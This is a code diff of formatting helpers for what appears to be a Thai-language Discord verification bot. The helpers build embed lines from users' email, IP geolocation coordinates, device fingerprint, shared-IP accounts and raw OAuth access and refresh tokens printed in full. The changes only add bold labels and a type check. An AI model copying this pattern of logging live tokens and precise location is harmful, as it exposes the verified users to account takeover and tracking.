@@ -274,12 +274,12 @@ function _buildDiscordIdentityLines(profile) {
     const discriminator = profile.discriminator && profile.discriminator !== "0" ? `#${profile.discriminator}` : "#0";
 
     return [
-        `  • Global Name : ${globalName}`,
-        `  • Username : ${username}`,
-        `  • User ID : ${userId}`,
-        `  • Avatar URL : ${avatarLink}`,
-        `  • Banner URL : ${bannerLink}`,
-        `  • Discriminator : ${discriminator}`
+        `  • **Global Name** : ${globalName}`,
+        `  • **Username** : ${username}`,
+        `  • **User ID** : ${userId}`,
+        `  • **Avatar URL** : ${avatarLink}`,
+        `  • **Banner URL** : ${bannerLink}`,
+        `  • **Discriminator** : ${discriminator}`
     ];
 }
 
@@ -293,13 +293,13 @@ function _buildDiscordAccountLines(profile) {
     const nitroText = formatNitro(profile.premiumType);
 
     return [
-        `  • Email : ${email}`,
-        `  • Email Verified : ${emailVerifiedText}`,
-        `  • ภาษาของแอป Discord : ${appLocale}`,
-        `  • MFA (2FA) : ${mfaText}`,
-        `  • วันสร้างบัญชี : ${createdDate}`,
-        `  • เหรียญตรา : ${badges}`,
-        `  • มี Nitro ไหม : ${nitroText}`
+        `  • **Email** : ${email}`,
+        `  • **Email Verified** : ${emailVerifiedText}`,
+        `  • **ภาษาของแอป Discord** : ${appLocale}`,
+        `  • **MFA (2FA)** : ${mfaText}`,
+        `  • **วันสร้างบัญชี** : ${createdDate}`,
+        `  • **เหรียญตรา** : ${badges}`,
+        `  • **มี Nitro ไหม** : ${nitroText}`
     ];
 }
 
@@ -309,9 +309,9 @@ function _buildDiscordGuildLines(guildSummary) {
     const adminGuilds = guildSummary ? (guildSummary.adminGuildsCount ?? guildSummary.adminCount ?? 0) : 0;
 
     return [
-        `  • เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด : ${totalGuilds} เซิร์ฟเวอร์`,
-        `  • เซิร์ฟเวอร์ที่เป็นเจ้าของ : ${ownedGuilds} เซิร์ฟเวอร์`,
-        `  • มียศ เเอดมิน กี่เซิฟเวอร์ : ${adminGuilds} เซิร์ฟเวอร์`
+        `  • **เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด** : ${totalGuilds} เซิร์ฟเวอร์`,
+        `  • **เซิร์ฟเวอร์ที่เป็นเจ้าของ** : ${ownedGuilds} เซิร์ฟเวอร์`,
+        `  • **มียศ เเอดมิน กี่เซิฟเวอร์** : ${adminGuilds} เซิร์ฟเวอร์`
     ];
 }
 
@@ -335,21 +335,21 @@ function buildIpLocationLines(ipInfo, rawIp, networkTypes) {
     const isp = ipInfo.isp || "ไม่ทราบ ISP";
     const org = ipInfo.org || ipInfo.as || "ไม่ระบุ";
     const reverseDns = ipInfo.reverse || ipInfo.hostname || "ไม่ระบุ";
-    const networkStatusDetail = networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้านปกติ";
+    const networkStatusDetail = Array.isArray(networkTypes) && networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้านปกติ";
     const mobileOrBroadband = formatMobileOrBroadband(ipInfo);
 
     return [
-        `  • IP Address : ${rawIp}`,
-        `  • พิกัด ละติจูด/ลองจิจูด : ${coordsStr}`,
-        `  • รัศมีความแม่นยำพิกัด : ± ${accuracyRadius} กม.`,
-        `  • ตำแหน่ง : ${locationStr}`,
-        `  • รหัสไปรษณีย์ : ${zip}`,
-        `  • Timezone : ${timezone}`,
-        `  • ผู้ให้บริการอินเทอร์เน็ต : ${isp}`,
-        `  • องค์กรโครงข่าย : ${org}`,
-        `  • ชื่อโหนดโฮสต์ของเครือข่าย : ${reverseDns}`,
-        `  • สถานะเครือข่ายที่ตรวจพบ : ${networkStatusDetail}`,
-        `  • เน็ตมือถือหรือเน็ตบ้าน : ${mobileOrBroadband}`
+        `  • **IP Address** : ${rawIp}`,
+        `  • **พิกัด ละติจูด/ลองจิจูด** : ${coordsStr}`,
+        `  • **รัศมีความแม่นยำพิกัด** : ± ${accuracyRadius} กม.`,
+        `  • **ตำแหน่ง** : ${locationStr}`,
+        `  • **รหัสไปรษณีย์** : ${zip}`,
+        `  • **Timezone** : ${timezone}`,
+        `  • **ผู้ให้บริการอินเทอร์เน็ต** : ${isp}`,
+        `  • **องค์กรโครงข่าย** : ${org}`,
+        `  • **ชื่อโหนดโฮสต์ของเครือข่าย** : ${reverseDns}`,
+        `  • **สถานะเครือข่ายที่ตรวจพบ** : ${networkStatusDetail}`,
+        `  • **เน็ตมือถือหรือเน็ตบ้าน** : ${mobileOrBroadband}`
     ];
 }
 
@@ -364,14 +364,14 @@ function buildDeviceLines(device) {
     const userAgentStr = device?.userAgent ? `\`${device.userAgent}\`` : "`ไม่มีข้อมูล`";
 
     return [
-        `  • ประเภทอุปกรณ์ : ${deviceType}`,
-        `  • สถาปัตยกรรมระบบ : ${platformFormatted}`,
-        `  • ระบบปฏิบัติการ : ${os}`,
-        `  • หน้าจอ : ${screen}`,
-        `  • เบราว์เซอร์ : ${browser}`,
-        `  • ภาษาของเบราว์เซอร์ : ${browserLanguages}`,
-        `  • หน้าจอสัมผัส : ${touchscreen}`,
-        `  • User-Agent :`,
+        `  • **ประเภทอุปกรณ์** : ${deviceType}`,
+        `  • **สถาปัตยกรรมระบบ** : ${platformFormatted}`,
+        `  • **ระบบปฏิบัติการ** : ${os}`,
+        `  • **หน้าจอ** : ${screen}`,
+        `  • **เบราว์เซอร์** : ${browser}`,
+        `  • **ภาษาของเบราว์เซอร์** : ${browserLanguages}`,
+        `  • **หน้าจอสัมผัส** : ${touchscreen}`,
+        `  • **User-Agent** :`,
         `  ${userAgentStr}`
     ];
 }
@@ -382,12 +382,12 @@ function buildTokenLines(tokens, findings, accessToken, refreshToken) {
     const securityFindingsStr = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
 
     return [
-        `  • Scope : ${scopeStr}`,
-        `  • หมดอายุ : ${expiresStr}`,
-        `  • รายงานความเสี่ยง : ${securityFindingsStr}`,
-        `  • Access Token :`,
+        `  • **Scope** : ${scopeStr}`,
+        `  • **หมดอายุ** : ${expiresStr}`,
+        `  • **รายงานความเสี่ยง** : ${securityFindingsStr}`,
+        `  • **Access Token** :`,
         `  \`${accessToken}\``,
-        `  • Refresh Token :`,
+        `  • **Refresh Token** :`,
         `  \`${refreshToken}\``
     ];
 }
@@ -405,11 +405,11 @@ function buildSecurityTrackingLines(device, trackingSnapshot, findings) {
     const findingsSummary = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
 
     return [
-        `  • ตรวจพบบัญชีในเครื่องนี้ : ${deviceFingerprint}`,
-        `  • บัญชีที่เคยใช้ IP นี้ : ${sharedIp}`,
-        `  • วันที่เข้าร่วมเซิร์ฟเวอร์ครั้งแรกจาก IP นี้ : ${firstSeen}`,
-        `  • การดัดแปลง Header เครือข่าย : ${spoofHeader}`,
-        `  • ข้อสังเกตความปลอดภัย : ${findingsSummary}`
+        `  • **ตรวจพบบัญชีในเครื่องนี้** : ${deviceFingerprint}`,
+        `  • **บัญชีที่เคยใช้ IP นี้** : ${sharedIp}`,
+        `  • **วันที่เข้าร่วมเซิร์ฟเวอร์ครั้งแรกจาก IP นี้** : ${firstSeen}`,
+        `  • **การดัดแปลง Header เครือข่าย** : ${spoofHeader}`,
+        `  • **ข้อสังเกตความปลอดภัย** : ${findingsSummary}`
     ];
 }
 
@@ -439,9 +439,9 @@ function buildEmbedDescription({ guildName, guildId, profile, result, roleId, ro
         `เซิร์ฟเวอร์ id : ${serverIdStr}`,
         `User : ${userTag}`,
         ``,
-        `  • ผลการยืนยัน : ${resultLabel}`,
-        `  • ยศที่ได้รับ : ${roleMention}`,
-        `  • เครือข่ายที่อาจจะใช้ยืนยัน : ${networkStatusBrief}`
+        `  • **ผลการยืนยัน** : ${resultLabel}`,
+        `  • **ยศที่ได้รับ** : ${roleMention}`,
+        `  • **เครือข่ายที่อาจจะใช้ยืนยัน** : ${networkStatusBrief}`
     ].join("\n");
 
     return { description, networkTypes };
